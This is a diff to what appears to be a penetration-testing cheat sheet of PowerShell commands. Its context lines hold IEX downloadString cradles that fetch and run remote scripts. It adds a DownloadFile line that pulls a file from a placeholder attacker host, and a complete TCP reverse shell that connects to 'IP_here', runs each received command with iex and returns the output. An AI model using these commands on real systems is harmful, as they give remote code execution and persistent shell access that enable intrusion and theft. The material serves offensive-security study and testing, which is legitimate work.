@@ -1505,6 +1505,9 @@ IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
 IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
 Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile
 
+# transfer file
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP_here/file_here','C:\path\to\outfile')"
+
 # read text file
 Get-Content file_name-here
 
@@ -1529,6 +1532,20 @@ Invoke-AllChecks
 
 # view file permissions
 dir | Get-ACL
+
+# reverse shell
+$client = New-Object System.Net.Sockets.TCPClient('IP_here',port_here);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+  $sendback = (iex $data 2>&1 |Out-String);
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte, 0, $sendbyte.Length);
+  $stream.Flush();
+}
+$client.Close();
 ```
 
 
